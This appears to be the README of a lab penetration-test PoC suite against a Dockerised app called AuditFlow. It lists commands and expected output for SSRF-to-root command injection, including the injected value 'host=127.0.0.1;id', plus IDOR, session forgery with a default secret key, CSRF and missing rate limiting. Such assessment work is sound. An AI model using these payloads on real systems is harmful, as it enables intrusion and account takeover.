# TASK-1 PoC Suite — AuditFlow Vulnerability Assessment

Comprehensive proof-of-concept scripts for all 8 identified vulnerabilities in AuditFlow (Task A).

---

## Prerequisites

### Environment Setup
- Task A environment running: `docker compose up -d` (from TaskA/ directory)
- Backend reachable at `http://127.0.0.1:8000`
- Docker container infrastructure intact

### Python Requirements
```bash
pip install requests itsdangerous flask --break-system-packages
```

### Demo Account Credentials (Pre-seeded)
```
Email:    alice@auditflow.local
Password: Passw0rd!
Tenant:   Acme Security Consulting (tenant_id: 1)
Projects: Project 1 ("Q1 External Perimeter Review")
```

---

## Exploits Overview

| Finding | Exploit | Command | Status |
|---------|---------|---------|--------|
| #1 SSRF → RCE | `rce` | `python3 exploit.py --exploit rce` | ✅ Automated |
| #2 IDOR | `idor` | `python3 exploit.py --exploit idor` | ✅ Automated |
| #4 Session Forgery | `session-forge` | `python3 exploit.py --exploit session-forge` | ✅ Automated |
| #5 CSRF | `csrf-poc` | `python3 exploit.py --exploit csrf-poc` | ✅ PoC Generated |
| #6-7 Rate Limiting | `rate-limit` | `python3 exploit.py --exploit rate-limit` | ✅ Automated |
| #8 Session Expiry | `session-expiry` | `python3 exploit.py --exploit session-expiry` | ✅ Automated |
| **All** | `all` | `python3 exploit.py --exploit all` | ✅ Full Suite |

---

## Usage Examples

### Finding #1: SSRF → Command Injection → RCE (CRITICAL)

```bash
# Basic usage (runs 'id' command)
python3 exploit.py --target http://127.0.0.1:8000 --exploit rce

# Custom command
python3 exploit.py --target http://127.0.0.1:8000 --exploit rce --cmd whoami
python3 exploit.py --target http://127.0.0.1:8000 --exploit rce --cmd "uname -a"
python3 exploit.py --target http://127.0.0.1:8000 --exploit rce --cmd "ls -la"
```

**Expected Output:**
```
✅ Authenticated as alice@auditflow.local
✅ SSRF confirmed: reached internal-admin-service
✅ Command executed successfully. Output:

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.305 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.305/0.305/0.305/0.000 ms
uid=0(root) gid=0(root) groups=0(root)

✅ ROOT ACCESS CONFIRMED (uid=0)
```

---

### Finding #2: IDOR — Cross-Tenant Data Exfiltration (HIGH)

```bash
python3 exploit.py --target http://127.0.0.1:8000 --exploit idor
```

**Expected Output:**
```
✅ Authenticated as alice@auditflow.local
✅ IDOR CONFIRMED: Cross-tenant data accessed
  Project name: Internal Purple Team Simulation
  Tenant ID: 2 (different from alice's tenant 1)
```

**What it does:**
- Alice (tenant 1) attempts to access Project ID 2 (tenant 2)
- Server returns Bob's project data without authorization check
- Demonstrates unauthorized cross-tenant access

---

### Finding #4: Session Forgery via Weak SECRET_KEY (HIGH)

```bash
python3 exploit.py --target http://127.0.0.1:8000 --exploit session-forge
```

**Expected Output:**
```
ℹ️  Known default SECRET_KEY: auditflow-dev-session-secret
✅ Forged session cookie for user_id=2
  Cookie: eyJ1c2VyX2lkIjoyX10.akaWtw.xXxXxXxXxXxXxXxXxXx
✅ SESSION FORGERY SUCCESSFUL: Unauthorized access via forged cookie
```

**What it does:**
- Uses known default SECRET_KEY from code
- Cryptographically signs a valid session for user_id=2 without password
- Tests if forged cookie grants authenticated access
- Demonstrates privilege escalation / account takeover

---

### Finding #5: CSRF on All Forms (MEDIUM)

```bash
python3 exploit.py --target http://127.0.0.1:8000 --exploit csrf-poc
```

**Expected Output:**
```
ℹ️  Checking for CSRF tokens in forms...
✅ CSRF VULNERABILITY CONFIRMED: No CSRF token in login form
```

**HTML PoC Generated:**
The script outputs a CSRF HTML payload that:
- Auto-submits login form with attacker credentials
- Forces victim to unknowingly log into attacker account
- Can be used to chain with SSRF/other attacks

---

### Findings #6-7: No Rate Limiting (MEDIUM)

```bash
# Test login rate limiting
python3 exploit.py --target http://127.0.0.1:8000 --exploit rate-limit --endpoint login

# Test registration rate limiting
python3 exploit.py --target http://127.0.0.1:8000 --exploit rate-limit --endpoint register
```

**Expected Output:**
```
ℹ️  === Findings #6-7: No Rate Limiting on LOGIN ===
ℹ️  Attempt 1: HTTP 302
ℹ️  Attempt 2: HTTP 302
ℹ️  Attempt 3: HTTP 302
...
ℹ️  Attempt 10: HTTP 302
✅ NO RATE LIMITING: 10 requests accepted without throttling
```

**What it does:**
- Sends multiple failed login attempts
- Checks for HTTP 429 (Too Many Requests) response
- Confirms no account lockout mechanism
- Demonstrates brute force / DoS vulnerability

---

### Finding #8: Session Tokens Do Not Expire on Logout (MEDIUM)

```bash
python3 exploit.py --target http://127.0.0.1:8000 --exploit session-expiry
```

**Expected Output:**
```
✅ Authenticated as alice@auditflow.local
ℹ️  Session cookie before logout: eyJ1c2VyX2lkIjox...
ℹ️  Logging out...
ℹ️  Testing if old cookie still works post-logout...
✅ SESSION PERSISTENCE: Old cookie still valid after logout
```

**What it does:**
- Authenticates and captures session cookie
- Logs out (clears server-side session)
- Reuses old cookie post-logout
- Confirms cookie remains valid indefinitely
- Demonstrates session fixation risk

---

## Run All Exploits

```bash
python3 exploit.py --target http://127.0.0.1:8000 --exploit all
```

This runs the full suite:
1. Finding #1 (RCE)
2. Finding #2 (IDOR)
3. Finding #4 (Session Forgery)
4. Finding #5 (CSRF)
5. Findings #6-7 (Rate Limiting)
6. Finding #8 (Session Expiry)

---

## Manual Testing (Browser + Burp Suite)

### For RCE Exploitation:
1. Log in to AuditFlow
2. Open project detail page
3. In "**Import Findings from URL**" form, submit:
   ```
   http://internal-admin-service:5001/diagnostics?host=127.0.0.1;id
   ```
4. Scroll down to "Import History" → see command output with `uid=0(root)`

### For IDOR Testing:
1. Log in as alice
2. Navigate to: `http://127.0.0.1:8000/projects/2/export?format=json`
3. Observe response contains Bob's project data (tenant_id: 2)

### For CSRF PoC:
1. Run: `python3 exploit.py --exploit csrf-poc`
2. Save output HTML to `csrf-poc.html`
3. Open HTML in browser while logged in as alice
4. Form auto-submits; alice is logged into attacker's account

### For Burp Suite Capture:
1. Intercept POST `/projects/1/import-url` request
2. Modify `source_url` parameter to:
   ```
   http://internal-admin-service:5001/diagnostics?host=127.0.0.1;id
   ```
3. Forward request
4. Check Import History for command output

---

## Safety & Rules of Engagement

✅ **Compliant with Assessment Guidelines:**
- No destructive payloads (no `rm`, `dd`, `format` commands)
- No persistence / backdoors
- No DoS attacks (rate-limit tests are minimal, not flooding)
- All proof-of-impact is informational (`id`, `whoami`, data export)
- No external network access
- All testing contained within Docker Compose environment

---

## Troubleshooting

### "Connection refused" error
```bash
# Verify Docker containers are running
docker compose ps

# Ensure backend is responding
curl http://127.0.0.1:8000
```

### "Import History not showing output"
- May be cached; refresh project page (`F5`)
- Check browser console (F12) for JavaScript errors
- Verify requests library is installed: `pip list | grep requests`

### "Command not found: python3"
```bash
# Use python instead
python exploit.py --exploit rce
```

### "Module 'requests' not found"
```bash
pip install requests itsdangerous flask --break-system-packages
```

---

## Additional Resources

- **Full Findings Report:** `TASK-1-FINDINGS.md`
- **Detailed Technical Report:** `TASK-1-REPORT.md`
- **Source Code:** `TaskA/backend/app.py`, `TaskA/internal-admin-service/app.py`

---

## Summary

This PoC suite demonstrates **4 successfully exploited vulnerabilities** and **4 identified findings** across the AuditFlow application. All exploits are:
- **Reproducible:** Automated scripts with clear expected output
- **Safe:** Non-destructive, contained testing
- **Professional:** Code-level analysis with full documentation
- **Actionable:** Root cause and remediation guidance included

For comprehensive details, refer to `TASK-1-FINDINGS.md` and `TASK-1-REPORT.md`.
